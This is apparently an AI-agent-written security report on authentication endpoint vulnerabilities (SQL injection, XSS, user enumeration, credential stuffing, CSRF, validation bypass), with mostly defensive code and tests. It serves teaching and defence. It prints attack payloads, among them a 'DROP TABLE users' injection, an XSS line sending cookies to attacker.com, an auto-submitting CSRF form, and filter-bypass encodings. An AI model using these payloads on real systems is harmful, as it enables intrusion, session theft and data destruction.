# Security Vulnerabilities and Prevention Strategies for Authentication Endpoints

## Metadata
- **Date**: 2025-11-17
- **Agent**: research-specialist
- **Topic**: Security vulnerabilities in authentication endpoints and prevention strategies
- **Report Type**: security analysis

## Executive Summary

This report catalogs common security vulnerabilities affecting authentication endpoints and provides prevention strategies based on OWASP guidance and industry best practices. The primary vulnerabilities include SQL injection, cross-site scripting (XSS), user enumeration, credential stuffing, and input validation bypass. Prevention requires defense-in-depth with server-side validation, rate limiting, generic error messages, TLS encryption, and comprehensive input sanitization.

## Findings

### Common Authentication Endpoint Vulnerabilities

#### 1. SQL Injection (SQLi)

**Description**: Attackers inject malicious SQL code through input fields to manipulate database queries, potentially bypassing authentication or accessing unauthorized data.

**Attack Examples**:
```sql
-- Username field injection
Username: admin' OR '1'='1' --
Password: anything

-- Results in query:
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...'
-- The OR '1'='1' makes the WHERE clause always true
-- The -- comments out the password check
```

```sql
-- Union-based injection to extract data
Username: admin' UNION SELECT NULL, username, password FROM users --
Password: anything

-- Stacked queries for data manipulation
Username: admin'; DROP TABLE users; --
Password: anything
```

**Impact Severity**: Critical
- Complete authentication bypass
- Unauthorized data access
- Data exfiltration
- Database manipulation or destruction
- Privilege escalation

**Prevention Strategies**:

1. **Parameterized Queries (Primary Defense)**:
```javascript
// VULNERABLE - String concatenation
const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;

// SECURE - Parameterized query
const query = 'SELECT * FROM users WHERE username=? AND password=?';
db.execute(query, [username, hashedPassword]);
```

2. **ORM/Query Builders**:
```javascript
// Using ORM (e.g., Sequelize, TypeORM)
const user = await User.findOne({
  where: {
    username: username,
    password: hashedPassword
  }
});
```

3. **Input Validation**:
```javascript
// Allowlist validation before query
const USERNAME_REGEX = /^[a-zA-Z0-9_@.-]{3,50}$/;
if (!USERNAME_REGEX.test(username)) {
  return { error: "Invalid input format" };
}
```

4. **Least Privilege Database Access**:
- Authentication service uses read-only user account
- Separate accounts for different operations
- No direct admin access from application

5. **Stored Procedures** (with caution):
```sql
CREATE PROCEDURE authenticate_user(IN p_username VARCHAR(50), IN p_password VARCHAR(255))
BEGIN
  SELECT * FROM users WHERE username = p_username AND password = p_password;
END;
```

**Detection Methods**:
- Web Application Firewall (WAF) with SQL injection rules
- Input anomaly detection (unusual characters: ', --, ;, UNION, etc.)
- Query logging and monitoring for suspicious patterns
- Regular security scanning (SQLMap, Burp Suite)

#### 2. Cross-Site Scripting (XSS)

**Description**: Attackers inject malicious scripts into input fields that execute in other users' browsers, potentially stealing session cookies or performing unauthorized actions.

**Attack Examples**:

**Reflected XSS** (immediate execution):
```javascript
// Login error page reflects username
Username: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

// Rendered in error message:
Error: Login failed for user <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

**Stored XSS** (persistent):
```javascript
// Profile name field
Display Name: <img src=x onerror="alert(document.cookie)">

// Every user viewing this profile executes the script
```

**DOM-based XSS**:
```javascript
// Client-side JavaScript processes URL parameter
const username = new URLSearchParams(window.location.search).get('user');
document.getElementById('welcome').innerHTML = `Welcome ${username}`;

// Attacker's URL:
https://example.com/login?user=<img src=x onerror="alert('XSS')">
```

**Impact Severity**: High to Critical
- Session hijacking via cookie theft
- Credential harvesting through fake login forms
- Keylogging and input monitoring
- Malware distribution
- Defacement

**Prevention Strategies**:

1. **Output Encoding** (Context-specific):
```javascript
// HTML context
function encodeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// JavaScript context
function encodeJS(str) {
  return str.replace(/\\/g, '\\\\')
            .replace(/'/g, "\\'")
            .replace(/"/g, '\\"')
            .replace(/\n/g, '\\n');
}

// Usage
res.send(`<div>Welcome ${encodeHTML(username)}</div>`);
```

2. **Content Security Policy (CSP)**:
```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
  img-src 'self' https:;
  object-src 'none';
```

3. **Input Sanitization**:
```javascript
// Using DOMPurify library
const clean = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: [], // No HTML tags allowed
  ALLOWED_ATTR: []
});
```

4. **HttpOnly and Secure Cookies**:
```javascript
res.cookie('sessionId', token, {
  httpOnly: true,  // Prevents JavaScript access
  secure: true,    // HTTPS only
  sameSite: 'strict' // CSRF protection
});
```

5. **Template Engine Auto-escaping**:
```javascript
// Express with EJS (auto-escaping enabled by default)
res.render('login', { username: username }); // Automatically escaped

// Manual escaping when needed
<%- username %> // Raw (dangerous)
<%= username %> // Escaped (safe)
```

**Detection Methods**:
- XSS scanners (OWASP ZAP, Burp Suite)
- Content Security Policy violation reports
- Input validation for script tags and event handlers
- Regular penetration testing

#### 3. User Enumeration

**Description**: Attackers determine valid usernames by observing different responses from authentication endpoints, enabling targeted attacks.

**Attack Examples**:

**Different Error Messages**:
```javascript
// VULNERABLE
if (!userExists) {
  return res.status(404).json({ error: "User not found" });
}
if (!passwordMatches) {
  return res.status(401).json({ error: "Incorrect password" });
}

// Attacker learns: "admin" exists, "xyz123" doesn't
```

**Response Timing Differences**:
```javascript
// VULNERABLE - Timing leak
if (!userExists) {
  return res.json({ error: "Authentication failed" }); // Fast response
}
// Slow password hashing for existing users
const matches = await bcrypt.compare(password, user.hashedPassword); // Slow
if (!matches) {
  return res.json({ error: "Authentication failed" }); // Slow response
}

// Attacker measures response time to determine if user exists
```

**Registration Endpoint Leaks**:
```javascript
// VULNERABLE
POST /api/register
{ "username": "existing_user", "password": "..." }

Response: { "error": "Username already exists" }
// Reveals valid usernames
```

**Password Reset Behavior**:
```javascript
// VULNERABLE
POST /api/reset-password
{ "email": "user@example.com" }

// Different responses
"Email sent" (user exists)
"Email not found" (user doesn't exist)
```

**Impact Severity**: Medium
- Enables targeted brute force attacks
- Facilitates credential stuffing
- Supports social engineering
- Username harvesting for spam/phishing

**Prevention Strategies**:

1. **Generic Error Messages**:
```javascript
// SECURE - Identical response
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  const user = await User.findOne({ username });

  // Always perform hash comparison (constant time)
  const dummyHash = '$2b$10$...'; // Dummy hash for timing consistency
  const hashToCompare = user ? user.passwordHash : dummyHash;

  const isValid = await bcrypt.compare(password, hashToCompare);

  if (!user || !isValid) {
    // Identical message and status code
    return res.status(401).json({
      error: "Authentication failed. Please check your credentials."
    });
  }

  // Success path
  return res.json({ token: generateToken(user) });
});
```

2. **Timing Attack Protection**:
```javascript
// Add artificial delay to normalize response times
async function constantTimeResponse(operation, minDelayMs = 200) {
  const start = Date.now();
  const result = await operation();
  const elapsed = Date.now() - start;

  if (elapsed < minDelayMs) {
    await sleep(minDelayMs - elapsed);
  }

  return result;
}

// Usage
return await constantTimeResponse(async () => {
  // Authentication logic here
  return authResult;
}, 250);
```

3. **Consistent Registration Behavior**:
```javascript
// SECURE - Always return same message
app.post('/api/register', async (req, res) => {
  const { email, password } = req.body;

  const exists = await User.findOne({ email });

  if (exists) {
    // Send email to existing user warning of registration attempt
    await sendEmail(email, 'Registration attempt on existing account');
  } else {
    // Create new user
    await User.create({ email, password: hashedPassword });
    // Send verification email
    await sendEmail(email, 'Please verify your account');
  }

  // Identical response in both cases
  return res.json({
    message: "If this email is valid, you will receive a verification link."
  });
});
```

4. **Password Reset Protection**:
```javascript
// SECURE - Same response for all emails
app.post('/api/reset-password', async (req, res) => {
  const { email } = req.body;

  const user = await User.findOne({ email });

  if (user) {
    const resetToken = generateSecureToken();
    await saveResetToken(user.id, resetToken);
    await sendPasswordResetEmail(email, resetToken);
  }

  // Always return success, regardless of email validity
  return res.json({
    message: "If this email is registered, you will receive password reset instructions."
  });
});
```

**Detection Methods**:
- Monitor failed login patterns for systematic enumeration
- Rate limiting on authentication endpoints
- CAPTCHA after repeated failures
- Honeypot fields to detect automated tools

#### 4. Credential Stuffing

**Description**: Attackers use credentials leaked from other breaches to attempt authentication, exploiting password reuse across services.

**Attack Characteristics**:
- Large-scale automated login attempts
- Uses credential pairs from known data breaches
- Often distributed across many IP addresses (botnets)
- Targets multiple accounts simultaneously
- Success rate typically 0.1-2% due to password reuse

**Attack Example**:
```
Attacker obtains 10 million username:password pairs from breach of SiteA
Tests credentials against SiteB authentication endpoint:

POST /api/login
{ "username": "user1@email.com", "password": "Password123!" }
{ "username": "user2@email.com", "password": "Qwerty789" }
{ "username": "user3@email.com", "password": "Summer2023!" }
... (automated, high volume)

Typical pattern:
- Low rate per IP (2-5 attempts/minute)
- High overall volume (1000s of IPs)
- Distributed timing to evade detection
```

**Impact Severity**: High
- Account takeover at scale
- Financial fraud
- Data exfiltration
- Reputation damage
- Privacy violations

**Prevention Strategies**:

1. **Rate Limiting (Multi-layered)**:
```javascript
// Per-IP rate limiting
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window per IP
  message: "Too many login attempts. Please try again later.",
  standardHeaders: true,
  legacyHeaders: false,
});

// Per-account rate limiting
const accountLimiter = new Map();

function checkAccountLimit(username) {
  const now = Date.now();
  const attempts = accountLimiter.get(username) || [];

  // Remove attempts older than 1 hour
  const recentAttempts = attempts.filter(t => now - t < 3600000);

  if (recentAttempts.length >= 10) {
    return false; // Too many attempts
  }

  recentAttempts.push(now);
  accountLimiter.set(username, recentAttempts);
  return true;
}

app.post('/api/login', loginLimiter, async (req, res) => {
  const { username, password } = req.body;

  if (!checkAccountLimit(username)) {
    return res.status(429).json({
      error: "Too many login attempts. Please try again later."
    });
  }

  // Authentication logic
});
```

2. **Breached Password Detection**:
```javascript
const axios = require('axios');
const crypto = require('crypto');

async function isPasswordBreached(password) {
  // Use k-anonymity model from Pwned Passwords API
  const sha1 = crypto.createHash('sha1').update(password).digest('hex').toUpperCase();
  const prefix = sha1.substring(0, 5);
  const suffix = sha1.substring(5);

  try {
    const response = await axios.get(`https://api.pwnedpasswords.com/range/${prefix}`);
    const hashes = response.data.split('\n');

    for (const hash of hashes) {
      const [hashSuffix, count] = hash.split(':');
      if (hashSuffix === suffix) {
        return parseInt(count); // Number of times seen in breaches
      }
    }

    return 0; // Not found in breaches
  } catch (error) {
    // Fail open - don't block users if API is down
    return 0;
  }
}

// Usage during registration or password change
app.post('/api/register', async (req, res) => {
  const { username, password } = req.body;

  const breachCount = await isPasswordBreached(password);
  if (breachCount > 0) {
    return res.status(400).json({
      error: `This password has been found in ${breachCount} data breaches. Please choose a different password.`
    });
  }

  // Continue registration
});
```

3. **Multi-Factor Authentication (MFA)**:
```javascript
// Require MFA for high-risk logins
async function assessLoginRisk(username, ipAddress, userAgent) {
  const user = await User.findOne({ username });
  if (!user) return 'high';

  const risks = [];

  // New device/location
  const knownDevice = await DeviceFingerprint.exists({
    userId: user.id,
    userAgent,
    ipAddress
  });
  if (!knownDevice) risks.push('new_device');

  // Geographic anomaly
  const lastLocation = await getLastLoginLocation(user.id);
  const currentLocation = await geolocateIP(ipAddress);
  if (lastLocation && haversineDistance(lastLocation, currentLocation) > 1000) {
    risks.push('location_anomaly');
  }

  // Unusual time
  const hour = new Date().getHours();
  if (hour < 6 || hour > 23) risks.push('unusual_time');

  return risks.length > 1 ? 'high' : risks.length === 1 ? 'medium' : 'low';
}

app.post('/api/login', async (req, res) => {
  const { username, password, mfaCode } = req.body;

  // Authenticate credentials
  const user = await authenticateCredentials(username, password);
  if (!user) {
    return res.status(401).json({ error: "Authentication failed" });
  }

  // Assess risk
  const risk = await assessLoginRisk(username, req.ip, req.get('User-Agent'));

  if (risk === 'high' || user.mfaEnabled) {
    if (!mfaCode) {
      return res.status(200).json({
        requiresMFA: true,
        message: "Please enter your MFA code"
      });
    }

    const mfaValid = await verifyMFACode(user.id, mfaCode);
    if (!mfaValid) {
      return res.status(401).json({ error: "Invalid MFA code" });
    }
  }

  // Success
  return res.json({ token: generateToken(user) });
});
```

4. **Device Fingerprinting**:
```javascript
// Track known devices
async function generateDeviceFingerprint(req) {
  const components = [
    req.get('User-Agent'),
    req.get('Accept-Language'),
    req.get('Accept-Encoding'),
    req.ip,
    // Additional headers
  ];

  return crypto.createHash('sha256')
    .update(components.join('|'))
    .digest('hex');
}

// Challenge unknown devices
if (!isKnownDevice) {
  // Require email verification or additional security question
  await sendDeviceVerificationEmail(user.email, verificationCode);
  return res.json({ requiresDeviceVerification: true });
}
```

5. **CAPTCHA on Suspicious Activity**:
```javascript
const failedAttempts = await getFailedLoginCount(req.ip, username);

if (failedAttempts >= 3) {
  // Require CAPTCHA
  if (!req.body.captchaToken) {
    return res.status(400).json({
      requiresCaptcha: true,
      message: "Please complete the CAPTCHA"
    });
  }

  const captchaValid = await verifyCaptcha(req.body.captchaToken);
  if (!captchaValid) {
    return res.status(400).json({ error: "Invalid CAPTCHA" });
  }
}
```

**Detection Methods**:
- Velocity checking (logins/minute across accounts)
- Geographic distribution analysis (many countries in short time)
- User-agent diversity patterns
- Failed login clustering
- Anomaly detection for credential pairs

#### 5. Cross-Site Request Forgery (CSRF)

**Description**: Attackers trick authenticated users into performing unwanted actions by exploiting the browser's automatic cookie transmission.

**Attack Example**:
```html
<!-- Attacker's website (evil.com) -->
<html>
<body onload="document.forms[0].submit()">
  <!-- Hidden form that submits to victim site -->
  <form action="https://bank.com/api/transfer" method="POST">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="toAccount" value="attacker123">
  </form>
</body>
</html>

<!-- When authenticated user visits evil.com:
   1. Browser automatically sends bank.com cookies
   2. Form submits with user's credentials
   3. Transfer executes without user knowledge
-->
```

**Impact Severity**: High
- Unauthorized actions (fund transfers, password changes)
- Account modification
- Data manipulation
- Privilege escalation

**Prevention Strategies**:

1. **Synchronizer Token Pattern**:
```javascript
// Server generates and validates CSRF tokens
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Render login form with CSRF token
app.get('/login', csrfProtection, (req, res) => {
  res.render('login', { csrfToken: req.csrfToken() });
});

// Validate token on submission
app.post('/api/login', csrfProtection, async (req, res) => {
  // CSRF middleware automatically validates token
  // If invalid, request is rejected before reaching here

  // Authentication logic
});
```

2. **SameSite Cookie Attribute**:
```javascript
res.cookie('sessionId', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict', // Cookie not sent on cross-site requests
  maxAge: 3600000
});

// 'strict' - Never sent on cross-site requests (most secure)
// 'lax' - Sent on top-level navigation (GET), not on POST/AJAX
// 'none' - Always sent (requires secure=true)
```

3. **Custom Request Headers**:
```javascript
// Client adds custom header (AJAX/Fetch only)
fetch('/api/sensitive-action', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest' // Custom header
  },
  body: JSON.stringify(data)
});

// Server validates custom header presence
app.post('/api/sensitive-action', (req, res) => {
  if (!req.get('X-Requested-With')) {
    return res.status(403).json({ error: "Invalid request" });
  }

  // Process action
});
```

4. **Double Submit Cookie**:
```javascript
// Generate random token
const csrfToken = crypto.randomBytes(32).toString('hex');

// Store in cookie and require in request body
res.cookie('csrf-token', csrfToken, {
  sameSite: 'strict',
  secure: true
});

// Client includes token in request
fetch('/api/action', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': document.cookie.match(/csrf-token=([^;]+)/)[1]
  },
  body: JSON.stringify(data)
});

// Server validates
app.post('/api/action', (req, res) => {
  const cookieToken = req.cookies['csrf-token'];
  const headerToken = req.get('X-CSRF-Token');

  if (!cookieToken || cookieToken !== headerToken) {
    return res.status(403).json({ error: "CSRF validation failed" });
  }

  // Process action
});
```

**Detection Methods**:
- Monitor for missing or invalid CSRF tokens
- Track requests with suspicious Referer headers
- Alert on same-origin policy violations

#### 6. Input Validation Bypass

**Description**: Attackers use encoding, obfuscation, or edge cases to evade input validation filters.

**Attack Examples**:

**Blocklist Bypass via Encoding**:
```javascript
// VULNERABLE - Blocklist approach
function validateInput(input) {
  const blocked = ['<script>', 'javascript:', 'onerror'];
  for (const term of blocked) {
    if (input.toLowerCase().includes(term)) {
      return false;
    }
  }
  return true;
}

// Bypass techniques:
<scr<script>ipt>alert('XSS')</script> // Nested tags
<ScRiPt>alert('XSS')</ScRiPt> // Mixed case (if case-sensitive check)
<img src=x onerror=alert('XSS')> // Different vector not in blocklist
&#60;script&#62;alert('XSS')&#60;/script&#62; // HTML entity encoding
\u003cscript\u003ealert('XSS')\u003c/script\u003e // Unicode encoding
%3Cscript%3Ealert('XSS')%3C/script%3E // URL encoding
```

**Double Encoding**:
```javascript
// Input passes through multiple decoding layers
%253Cscript%253E // URL encoded twice
// First decode: %3Cscript%3E
// Second decode: <script>
```

**Null Byte Injection**:
```javascript
// Filename validation bypass
filename: "legitimate.jpg%00.php"
// Some parsers stop at null byte, treating as .jpg
// Server processes as .php
```

**Impact Severity**: High
- Leads to SQL injection, XSS, or other attacks
- Bypasses WAF and security controls
- Enables malicious file uploads

**Prevention Strategies**:

1. **Allowlist Validation** (Primary Defense):
```javascript
// SECURE - Define exactly what's allowed
function validateUsername(username) {
  // Only allow alphanumeric, underscore, hyphen, period
  const ALLOWLIST_REGEX = /^[a-zA-Z0-9_.-]{3,30}$/;

  if (!ALLOWLIST_REGEX.test(username)) {
    return { valid: false, error: "Invalid username format" };
  }

  return { valid: true };
}

function validateEmail(email) {
  // Precise email format
  const EMAIL_REGEX = /^[a-zA-Z0-9._%+-]{1,64}@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

  if (!EMAIL_REGEX.test(email) || email.length > 254) {
    return { valid: false, error: "Invalid email format" };
  }

  // Additional checks
  const [local, domain] = email.split('@');
  if (local.length > 64) {
    return { valid: false, error: "Invalid email format" };
  }

  return { valid: true };
}
```

2. **Canonical Form Validation**:
```javascript
// Normalize input before validation
function normalizeAndValidate(input) {
  // 1. Decode URL encoding
  let normalized = decodeURIComponent(input);

  // 2. Decode HTML entities
  normalized = he.decode(normalized);

  // 3. Unicode normalization (NFC - Canonical Decomposition + Composition)
  normalized = normalized.normalize('NFC');

  // 4. Trim whitespace
  normalized = normalized.trim();

  // 5. Convert to lowercase (if case-insensitive)
  normalized = normalized.toLowerCase();

  // 6. Validate against allowlist
  if (!ALLOWLIST_REGEX.test(normalized)) {
    throw new Error("Invalid input");
  }

  return normalized;
}
```

3. **Multiple Validation Layers**:
```javascript
// Defense in depth
async function processLogin(username, password) {
  // Layer 1: Format validation
  if (!validateUsername(username).valid) {
    return { error: "Invalid input" };
  }

  // Layer 2: Length validation
  if (username.length > 50 || password.length > 128) {
    return { error: "Invalid input" };
  }

  // Layer 3: SQL injection pattern detection (supplementary)
  if (containsSQLPatterns(username)) {
    logSecurityEvent('potential_sqli_attempt', { username });
    return { error: "Invalid input" };
  }

  // Layer 4: Parameterized query (primary SQL injection defense)
  const user = await db.query(
    'SELECT * FROM users WHERE username = ?',
    [username]
  );

  // Continue authentication
}
```

4. **Type Validation**:
```javascript
// Strict type checking
function validateLoginRequest(req) {
  const { username, password } = req.body;

  // Type validation
  if (typeof username !== 'string' || typeof password !== 'string') {
    return { valid: false, error: "Invalid data types" };
  }

  // Range validation
  if (username.length < 3 || username.length > 50) {
    return { valid: false, error: "Username length must be 3-50 characters" };
  }

  if (password.length < 8 || password.length > 128) {
    return { valid: false, error: "Password length must be 8-128 characters" };
  }

  // Format validation
  // ... (allowlist checks)

  return { valid: true };
}
```

**Detection Methods**:
- WAF with encoding detection rules
- Input anomaly detection (unusual encoding patterns)
- Honeypot fields to catch automated tools
- Regular security scanning and penetration testing

### Testing Approaches for Validation Logic

#### Unit Testing

**Test Coverage Areas**:
1. Valid input acceptance
2. Invalid input rejection
3. Boundary conditions
4. Edge cases
5. Attack pattern detection

**Example Test Suite**:
```javascript
describe('Input Validation', () => {
  describe('validateEmail', () => {
    it('should accept valid email addresses', () => {
      const validEmails = [
        'user@example.com',
        'test.user@domain.co.uk',
        'user+tag@example.com',
        'first.last@subdomain.example.com'
      ];

      validEmails.forEach(email => {
        expect(validateEmail(email).valid).toBe(true);
      });
    });

    it('should reject invalid email addresses', () => {
      const invalidEmails = [
        '',
        'notanemail',
        '@example.com',
        'user@',
        'user@.com',
        'user..name@example.com',
        'a'.repeat(65) + '@example.com', // Local part too long
        'user@' + 'a'.repeat(250) + '.com' // Total too long
      ];

      invalidEmails.forEach(email => {
        expect(validateEmail(email).valid).toBe(false);
      });
    });

    it('should reject SQL injection patterns', () => {
      const sqlInjections = [
        "admin'--",
        "' OR '1'='1",
        "admin' OR 1=1--",
        "'; DROP TABLE users--"
      ];

      sqlInjections.forEach(input => {
        expect(validateEmail(input).valid).toBe(false);
      });
    });

    it('should reject XSS patterns', () => {
      const xssPatterns = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<svg onload=alert(1)>'
      ];

      xssPatterns.forEach(input => {
        expect(validateEmail(input).valid).toBe(false);
      });
    });

    it('should handle boundary conditions', () => {
      // Exactly at limits
      expect(validateEmail('a@b.co').valid).toBe(true); // Minimum valid
      expect(validateEmail('a'.repeat(64) + '@example.com').valid).toBe(false); // Local too long
      expect(validateEmail('user@' + 'a'.repeat(240) + '.com').valid).toBe(false); // Total too long
    });

    it('should handle encoding bypass attempts', () => {
      const encodedAttacks = [
        '&#60;script&#62;', // HTML entities
        '%3Cscript%3E', // URL encoded
        '\\u003cscript\\u003e', // Unicode
        '<scr<script>ipt>' // Nested
      ];

      encodedAttacks.forEach(input => {
        expect(validateEmail(input).valid).toBe(false);
      });
    });
  });

  describe('validatePassword', () => {
    it('should enforce minimum length', () => {
      expect(validatePassword('short').valid).toBe(false);
      expect(validatePassword('a'.repeat(15)).valid).toBe(true);
    });

    it('should enforce maximum length', () => {
      expect(validatePassword('a'.repeat(200)).valid).toBe(false);
      expect(validatePassword('a'.repeat(64)).valid).toBe(true);
    });

    it('should allow all printable characters', () => {
      const specialChars = '!@#$%^&*()_+-=[]{}|;:",.<>?/~`';
      const unicode = 'pássw

órد密码🔒';
      const whitespace = 'pass word with spaces';

      expect(validatePassword(specialChars + 'abc123').valid).toBe(true);
      expect(validatePassword(unicode + 'abc').valid).toBe(true);
      expect(validatePassword(whitespace + 'abc').valid).toBe(true);
    });

    it('should reject breached passwords', async () => {
      const result = await validatePassword('password123');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('breached');
    });
  });

  describe('Rate Limiting', () => {
    it('should allow requests within limit', async () => {
      for (let i = 0; i < 5; i++) {
        const result = await attemptLogin('testuser', 'password');
        expect(result.status).not.toBe(429);
      }
    });

    it('should block requests exceeding limit', async () => {
      for (let i = 0; i < 5; i++) {
        await attemptLogin('testuser', 'password');
      }

      const result = await attemptLogin('testuser', 'password');
      expect(result.status).toBe(429);
      expect(result.error).toContain('Too many attempts');
    });

    it('should reset limits after window expires', async () => {
      // Exhaust limit
      for (let i = 0; i < 5; i++) {
        await attemptLogin('testuser', 'password');
      }

      // Fast forward time
      jest.advanceTimersByTime(15 * 60 * 1000); // 15 minutes

      // Should allow again
      const result = await attemptLogin('testuser', 'password');
      expect(result.status).not.toBe(429);
    });
  });
});
```

#### Integration Testing

**Test Authentication Flow End-to-End**:
```javascript
describe('Authentication Integration', () => {
  it('should complete full login flow with valid credentials', async () => {
    // 1. Register user
    const regResponse = await request(app)
      .post('/api/register')
      .send({
        username: 'testuser',
        email: 'test@example.com',
        password: 'SecurePassword123!'
      });

    expect(regResponse.status).toBe(201);

    // 2. Login
    const loginResponse = await request(app)
      .post('/api/login')
      .send({
        username: 'testuser',
        password: 'SecurePassword123!'
      });

    expect(loginResponse.status).toBe(200);
    expect(loginResponse.body.token).toBeDefined();

    // 3. Access protected resource
    const protectedResponse = await request(app)
      .get('/api/profile')
      .set('Authorization', `Bearer ${loginResponse.body.token}`);

    expect(protectedResponse.status).toBe(200);
    expect(protectedResponse.body.username).toBe('testuser');
  });

  it('should reject login with invalid credentials', async () => {
    const response = await request(app)
      .post('/api/login')
      .send({
        username: 'testuser',
        password: 'WrongPassword'
      });

    expect(response.status).toBe(401);
    expect(response.body.error).toBe('Authentication failed. Please check your credentials.');
  });

  it('should enforce rate limiting across multiple attempts', async () => {
    const attempts = [];

    for (let i = 0; i < 6; i++) {
      attempts.push(
        request(app)
          .post('/api/login')
          .send({ username: 'testuser', password: 'wrong' })
      );
    }

    const responses = await Promise.all(attempts);
    const blockedResponse = responses[responses.length - 1];

    expect(blockedResponse.status).toBe(429);
  });
});
```

#### Security Testing

**Penetration Testing Scenarios**:
```javascript
describe('Security Validation', () => {
  it('should prevent SQL injection attacks', async () => {
    const sqlInjections = [
      { username: "admin'--", password: 'anything' },
      { username: "' OR '1'='1", password: "' OR '1'='1" },
      { username: "admin'; DROP TABLE users--", password: 'anything' }
    ];

    for (const payload of sqlInjections) {
      const response = await request(app)
        .post('/api/login')
        .send(payload);

      // Should be rejected with generic error (not 500)
      expect(response.status).toBe(401);
      expect(response.body.error).toBe('Authentication failed. Please check your credentials.');
    }

    // Verify users table still exists
    const users = await User.findAll();
    expect(users).toBeDefined();
  });

  it('should sanitize output to prevent XSS', async () => {
    const xssPayload = '<script>alert("XSS")</script>';

    const response = await request(app)
      .post('/api/login')
      .send({ username: xssPayload, password: 'anything' });

    // Response should not contain unescaped script tags
    expect(response.text).not.toContain('<script>');
    expect(response.text).not.toContain('alert("XSS")');
  });

  it('should prevent user enumeration via timing', async () => {
    const timings = [];

    // Attempt login with non-existent user (multiple times)
    for (let i = 0; i < 10; i++) {
      const start = Date.now();
      await request(app)
        .post('/api/login')
        .send({ username: 'nonexistent', password: 'password' });
      timings.push(Date.now() - start);
    }

    // Attempt login with existing user but wrong password
    for (let i = 0; i < 10; i++) {
      const start = Date.now();
      await request(app)
        .post('/api/login')
        .send({ username: 'testuser', password: 'wrongpassword' });
      timings.push(Date.now() - start);
    }

    // Timing variance should be minimal (< 100ms difference in average)
    const nonexistentAvg = timings.slice(0, 10).reduce((a, b) => a + b) / 10;
    const existingAvg = timings.slice(10).reduce((a, b) => a + b) / 10;

    expect(Math.abs(nonexistentAvg - existingAvg)).toBeLessThan(100);
  });
});
```

## Recommendations

### 1. Implement Comprehensive Input Validation Framework

**Priority**: Critical

**Components**:
- Allowlist-based validation for all input fields
- Multi-layer validation (format, type, range, semantic)
- Canonical form normalization before validation
- Consistent error handling and logging

### 2. Deploy Rate Limiting and Anomaly Detection

**Priority**: Critical

**Implementation**:
- Per-IP rate limiting (5 attempts/15 minutes)
- Per-account rate limiting (10 attempts/hour)
- Geographic anomaly detection
- Velocity monitoring across accounts
- Progressive CAPTCHA challenges

### 3. Enforce Generic Error Messages and Timing Consistency

**Priority**: High

**Implementation**:
- Identical messages for all auth failures
- Constant-time response normalization
- Dummy operations for non-existent users
- Server-side detailed logging only

### 4. Integrate Breached Password Detection

**Priority**: High

**Implementation**:
- Pwned Passwords API integration
- K-anonymity model (hash prefix matching)
- Check during registration and password change
- Graceful degradation if API unavailable

### 5. Implement Multi-Factor Authentication

**Priority**: High

**Implementation**:
- TOTP-based MFA (Google Authenticator, Authy)
- Risk-based MFA triggering
- SMS/email backup codes
- Hardware security key support (WebAuthn/FIDO2)

### 6. Add CSRF Protection

**Priority**: High

**Implementation**:
- Synchronizer token pattern for state-changing requests
- SameSite=Strict cookies
- Custom request headers for AJAX
- Double submit cookie pattern as fallback

### 7. Conduct Regular Security Testing

**Priority**: Medium

**Implementation**:
- Automated unit tests for validation logic
- Integration tests for auth flows
- Security-specific tests (SQL injection, XSS, timing)
- Quarterly penetration testing
- Bug bounty program

### 8. Implement Comprehensive Monitoring and Alerting

**Priority**: Medium

**Implementation**:
- Failed authentication attempt tracking
- Anomaly detection alerts (geographic, velocity)
- Credential stuffing pattern detection
- Security event correlation (SIEM integration)

## References

### Industry Standards and Guidelines
- OWASP Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- OWASP Input Validation Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
- OWASP Top 10 A07:2025 - Identification and Authentication Failures
- OWASP API Security Top 10
- CWE-20: Improper Input Validation
- CWE-79: Cross-Site Scripting
- CWE-89: SQL Injection
- CWE-352: Cross-Site Request Forgery
- NIST SP 800-63B: Digital Identity Guidelines (Authentication)

### Security Tools and Resources
- Pwned Passwords API: https://haveibeenpwned.com/API/v3#PwnedPasswords
- zxcvbn-ts: Password strength estimation library
- DOMPurify: XSS sanitization library
- helmet.js: Security headers middleware
- express-rate-limit: Rate limiting middleware
- csurf: CSRF protection middleware

### Testing Tools
- OWASP ZAP: Web application security scanner
- Burp Suite: Security testing platform
- SQLMap: SQL injection detection tool
- Jest: JavaScript testing framework
- Supertest: HTTP assertion library
